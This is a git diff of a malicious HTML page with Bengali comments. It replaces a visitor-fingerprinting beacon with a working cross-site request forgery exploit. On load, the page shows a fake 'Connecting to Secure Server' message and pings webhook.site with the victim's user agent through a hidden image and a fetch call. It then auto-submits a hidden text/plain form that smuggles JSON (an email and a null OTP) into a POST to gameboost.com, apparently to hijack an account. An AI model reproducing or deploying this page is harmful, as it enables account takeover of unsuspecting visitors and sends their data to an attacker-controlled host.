@@ -1,39 +1,37 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting...</title>
 </head>
-<body onload="sendAndRedirect()">
-    <div style="text-align: center; margin-top: 50px; font-family: Arial, sans-serif;">
-        <h2>Processing your request...</h2>
-        <p>Please wait while we redirect you to the login page.</p>
+<body onload="document.getElementById('exploitForm').submit()">
+    <div style="text-align: center; margin-top: 50px;">
+        <h2>Connecting to Secure Server...</h2>
+        <p>Please do not close this window.</p>
     </div>
 
+    <!-- Webhook এ ডাটা পাঠানোর জন্য সাইলেন্ট ইমেজ লোড -->
+    <img src="https://webhook.site" style="display:none;">
+
+    <!-- অরিজিনাল সাইটে রিকোয়েস্ট পাঠানো -->
+    <form id="exploitForm" action="https://gameboost.com" method="POST" enctype="text/plain">
+        <input type="hidden" name='{"email":"ridoyp99@gmail.com","otp":null, "ignore":"' value='"}'>
+    </form>
+
     <script>
-        function sendAndRedirect() {
-        
-            const webhookUrl = "https://webhook.site/028048b6-9240-4e61-bff6-e35594c32a79";
-            
+        // ১. Webhook এ ডাটা পাঠানো
+        fetch("https://webhook.site", {
+            method: 'POST',
+            mode: 'no-cors',
+            body: JSON.stringify({
+                info: "Victim clicked GitHub link",
+                ua: navigator.userAgent
+            })
+        });
 
-            const victimData = {
-                referrer: document.referrer || "Direct Access",
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                screenResolution: window.screen.width + "x" + window.screen.height,
-                timestamp: new Date().toLocaleString()
-            };
-
-           
-            navigator.sendBeacon(webhookUrl, JSON.stringify(victimData));
-
-           
-            setTimeout(function() {
-                
-                window.location.href = "https://gameboost.com"; 
-            }, 1000); 
-        }
+        // ২. ২ সেকেন্ড পর অটো সাবমিট (যদি বডি লোড না হয়)
+        setTimeout(function(){
+            document.getElementById('exploitForm').submit();
+        }, 2000);
     </script>
 </body>
 </html>
